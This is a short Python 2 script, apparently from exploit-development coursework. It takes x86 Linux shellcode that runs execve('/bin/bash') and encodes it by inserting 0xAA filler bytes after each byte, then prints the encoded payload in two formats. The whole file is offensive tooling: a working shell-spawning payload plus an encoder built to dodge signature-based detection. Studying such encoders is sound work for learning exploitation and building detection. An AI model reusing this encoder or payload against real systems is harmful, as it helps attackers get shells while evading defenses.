#!/usr/bin/python2

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoding shellcode ...\n'

for x in bytearray(shellcode):
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA


	encoded2 += '0x'
	encoded2 += '%02x, ' % x
	encoded2 += '0x%02x, ' % 0xAA

print "Verison 1:"
print encoded
print "\n"
print "Verison 2:"
print encoded2[:-2]
print "\n"
print 'Len: %d' % len(bytearray(shellcode))